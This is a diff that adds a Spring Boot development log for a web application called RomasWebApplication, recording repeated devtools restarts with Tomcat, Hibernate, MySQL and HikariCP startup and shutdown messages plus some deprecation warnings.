@@ -1,0 +1,288 @@
+2021-11-04 21:59:47.415  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 21:59:47.416  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 21:59:47.559  INFO 43916 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : Devtools property defaults active! Set 'spring.devtools.add-properties' to 'false' to disable
+2021-11-04 21:59:47.559  INFO 43916 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : For additional web related logging consider setting the 'logging.level.web' property to 'DEBUG'
+2021-11-04 21:59:47.978  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 21:59:48.028  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 44 ms. Found 2 JPA repository interfaces.
+2021-11-04 21:59:48.385  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 21:59:48.391  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 21:59:48.391  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 21:59:48.462  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 21:59:48.462  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 903 ms
+2021-11-04 21:59:48.571  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 21:59:48.600  INFO 43916 --- [restartedMain] org.hibernate.Version                    : HHH000412: Hibernate ORM core version 5.4.32.Final
+2021-11-04 21:59:48.709  INFO 43916 --- [restartedMain] o.hibernate.annotations.common.Version   : HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
+2021-11-04 21:59:48.773  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 21:59:48.773  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 21:59:48.933  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 21:59:48.941  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 21:59:49.296  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 21:59:49.303  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 21:59:49.604  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 21:59:49.840  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 21:59:49.864  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 21:59:49.873  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 2.767 seconds (JVM running for 3.36)
+2021-11-04 21:59:49.982  INFO 43916 --- [http-nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring DispatcherServlet 'dispatcherServlet'
+2021-11-04 21:59:49.982  INFO 43916 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
+2021-11-04 21:59:49.982  INFO 43916 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 0 ms
+2021-11-04 21:59:50.201  WARN 43916 --- [http-nio-8080-exec-1] n.n.u.t.decorators.DecoratorProcessor    : The layout:decorator/data-layout-decorator processor has been deprecated and will be removed in the next major version of the layout dialect.  Please use layout:decorate/data-layout-decorate instead to future-proof your code.  See https://github.com/ultraq/thymeleaf-layout-dialect/issues/95 for more information.
+2021-11-04 21:59:50.302  WARN 43916 --- [http-nio-8080-exec-1] n.n.u.t.expressions.ExpressionProcessor  : Fragment expression "layout/default_layout" is being wrapped as a Thymeleaf 3 fragment expression (~{...}) for backwards compatibility purposes.  This wrapping will be dropped in the next major version of the expression processor, so please rewrite as a Thymeleaf 3 fragment expression to future-proof your code.  See https://github.com/thymeleaf/thymeleaf/issues/451 for more information.
+2021-11-04 21:59:50.715  WARN 43916 --- [http-nio-8080-exec-1] n.n.u.t.fragments.FragmentProcessor      : You don't need to put the layout:fragment/data-layout-fragment attribute into the <head> section - the decoration process will automatically copy the <head> section of your content templates into your layout page.
+2021-11-04 22:16:51.269  INFO 43916 --- [Thread-6] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:16:51.272  INFO 43916 --- [Thread-6] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:16:51.274  INFO 43916 --- [Thread-6] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:16:51.508  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:16:51.508  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:16:51.660  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:16:51.679  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 18 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:16:51.784  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:16:51.785  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:16:51.785  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:16:51.798  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:16:51.798  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 288 ms
+2021-11-04 22:16:51.825  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:16:51.828  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:16:51.828  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:16:51.907  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:16:51.908  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:16:51.937  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:16:51.937  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:16:52.027  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:16:52.082  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:16:52.090  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:16:52.093  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.612 seconds (JVM running for 1025.566)
+2021-11-04 22:16:52.094  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:17:29.540  INFO 43916 --- [Thread-9] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:17:29.541  INFO 43916 --- [Thread-9] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:17:29.543  INFO 43916 --- [Thread-9] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:17:29.711  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:17:29.712  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:17:29.853  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:17:29.872  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 18 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:17:29.972  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:17:29.973  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:17:29.973  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:17:29.984  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:17:29.984  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 271 ms
+2021-11-04 22:17:30.010  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:17:30.013  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:17:30.013  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:17:30.090  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:17:30.090  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:17:30.114  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:17:30.115  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:17:30.200  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:17:30.251  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:17:30.258  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:17:30.261  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.573 seconds (JVM running for 1063.733)
+2021-11-04 22:17:30.261  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:17:42.263  INFO 43916 --- [Thread-13] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:17:42.264  INFO 43916 --- [Thread-13] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:17:42.265  INFO 43916 --- [Thread-13] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:17:42.446  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:17:42.447  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:17:42.611  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:17:42.631  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 19 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:17:42.689  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:17:42.689  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:17:42.689  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:17:42.700  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:17:42.700  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 252 ms
+2021-11-04 22:17:42.727  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:17:42.730  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:17:42.731  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:17:42.831  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:17:42.831  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:17:42.854  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:17:42.855  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:17:42.939  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:17:42.988  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:17:42.996  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:17:42.999  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.584 seconds (JVM running for 1076.471)
+2021-11-04 22:17:42.999  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:17:49.796  INFO 43916 --- [Thread-17] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:17:49.796  INFO 43916 --- [Thread-17] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:17:49.798  INFO 43916 --- [Thread-17] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:17:49.935  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:17:49.935  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:17:50.064  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:17:50.081  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 17 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:17:50.135  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:17:50.136  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:17:50.136  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:17:50.146  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:17:50.146  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 209 ms
+2021-11-04 22:17:50.171  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:17:50.174  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:17:50.174  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:17:50.264  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:17:50.264  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:17:50.286  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:17:50.287  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:17:50.366  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:17:50.415  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:17:50.422  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:17:50.425  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.513 seconds (JVM running for 1083.898)
+2021-11-04 22:17:50.426  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:17:56.186  INFO 43916 --- [Thread-21] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:17:56.187  INFO 43916 --- [Thread-21] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:17:56.188  INFO 43916 --- [Thread-21] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:17:56.286  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:17:56.287  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:17:56.413  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:17:56.430  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 17 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:17:56.485  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:17:56.485  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:17:56.485  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:17:56.495  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:17:56.495  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 207 ms
+2021-11-04 22:17:56.520  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:17:56.523  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:17:56.523  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:17:56.595  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:17:56.595  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:17:56.617  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:17:56.617  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:17:56.699  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:17:56.746  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:17:56.753  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:17:56.756  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.491 seconds (JVM running for 1090.228)
+2021-11-04 22:17:56.757  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:18:00.452  INFO 43916 --- [Thread-25] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:18:00.453  INFO 43916 --- [Thread-25] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:18:00.454  INFO 43916 --- [Thread-25] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:18:00.592  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:18:00.592  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:18:00.733  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:18:00.754  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 21 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:18:00.856  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:18:00.856  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:18:00.856  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:18:00.868  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:18:00.869  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 276 ms
+2021-11-04 22:18:00.893  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:18:00.896  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:18:00.896  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:18:00.968  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:18:00.968  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:18:00.988  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:18:00.988  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:18:01.069  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:18:01.118  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:18:01.125  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:18:01.128  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.555 seconds (JVM running for 1094.599)
+2021-11-04 22:18:01.128  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:18:03.756  INFO 43916 --- [Thread-29] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
